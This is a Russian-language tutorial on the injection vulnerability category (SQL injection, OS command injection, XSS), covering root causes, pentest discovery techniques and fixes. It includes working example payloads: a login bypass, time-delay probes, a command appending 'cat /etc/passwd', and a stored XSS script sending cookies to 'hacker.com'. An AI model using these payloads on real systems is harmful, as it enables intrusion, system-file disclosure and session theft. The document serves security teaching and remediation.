Эта категория — «старая школа» кибербезопасности, которая до сих пор остается одной из самых опасных. В 2021 году в неё также включили **XSS (Cross-Site Scripting)**, так как XSS по сути является инъекцией вредоносного скрипта в браузер пользователя.

---

### **1. Общее описание**

Инъекция происходит, когда **доверенные данные** (ввод пользователя) отправляются интерпретатору в качестве части **команды или запроса**. Интерпретатор не может отличить данные от кода и выполняет вредоносные инструкции.

**Основные виды:**

- **SQL Injection (SQLi):** Внедрение в запросы к базе данных.
    
- **Command Injection:** Выполнение команд на уровне ОС.
    
- **Cross-Site Scripting (XSS):** Внедрение JavaScript-кода в веб-страницу.
    
- **NoSQL Injection:** Атаки на MongoDB, Cassandra и др.
    
- **LDAP / Email / Log Injection.**
    

---

### **2. Почему это возникает? (Корневые причины)**

- **Отсутствие фильтрации:** Приложение верит, что пользователь введет только то, что от него ждут (например, только цифру в поле ID).
    
- **Конкатенация строк:** Разработчик строит запрос, просто склеивая строки: `query = "SELECT * FROM users WHERE name = '" + user_input + "'"`.
    
- **Небезопасные функции:** Использование функций типа `eval()`, `exec()`, `system()`, `passthru()` в PHP, Python или JS с данными пользователя.
    

---

### **3. Методология поиска (Как искать пентестеру)**

- **Fuzzing (Фаззинг):**
    
    - Ввод спецсимволов во все поля: `'`, `"`, `\`, `;`, `|`, `[`, `]`, `{{`, `}}`.
        
    - Если сервер выдает ошибку 500 (Internal Server Error) или синтаксическую ошибку SQL — это зацепка.
        
- **Blind (Слепая) инъекция:**
    
    - Использование функций задержки: `'; WAITFOR DELAY '0:0:10'--` (SQL) или `; sleep 10` (OS). Если ответ задерживается на 10 секунд — инъекция подтверждена.
        
- **Boolean (Логическая) инъекция:**
    
    - Сравнение ответов сервера на запросы `' OR 1=1` (истина) и `' OR 1=2` (ложь). Если контент страницы меняется — база уязвима.
        
- **Поиск XSS:**
    
    - Ввод `<script>alert(1)</script>` в поля профиля, комментарии, URL-параметры. Проверка, отражается ли этот код в исходном коде страницы.
        

---

### **4. Как эксплуатировать (Примеры payloads)**

#### **Пример 1: SQL Injection (Обход авторизации)**

Поле логина: admin' --

Запрос превращается в: SELECT * FROM users WHERE login = 'admin' --' AND password = '...'

Символы -- превращают остаток запроса в комментарий. Вы входите как админ без пароля.

#### **Пример 2: OS Command Injection**

Приложение для проверки пинга: ping -c 1 8.8.8.8

Атакующий вводит: 8.8.8.8 ; cat /etc/passwd

Сервер выполнит: сначала пинг, а затем выведет список пользователей системы.

#### **Пример 3: Stored XSS (Кража куки)**

В поле «О себе» хакер пишет:

<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>

Каждый, кто зайдет на профиль хакера, невольно отправит свои куки на его сервер.

### **6. Как исправить (Рекомендации разработчику)**

1. **Prepared Statements (Параметризация):** Это защита №1. Данные отправляются в БД отдельно от текста запроса, и база никогда не воспримет их как код.
    
    - _Пример (Go):_ `db.Query("SELECT * FROM users WHERE id = ?", userID)`
        
2. **Allow-list Validation:** Проверять ввод по белому списку. Если нужен ID — разрешать только цифры. Если цвет — только HEX-код.
    
3. **Escaping / Encoding:**
    
    - Для SQL: использовать функции экранирования драйвера базы.
        
    - Для XSS: кодировать данные перед выводом в HTML (заменять `<` на `&lt;`).
        
4. **Использование безопасных API:** Избегать прямых вызовов оболочки (shell). Использовать встроенные функции языка для работы с файлами или процессами.
    
5. **CSP (Content Security Policy):** Настроить заголовок браузера, который запрещает выполнение скриптов со сторонних ресурсов.
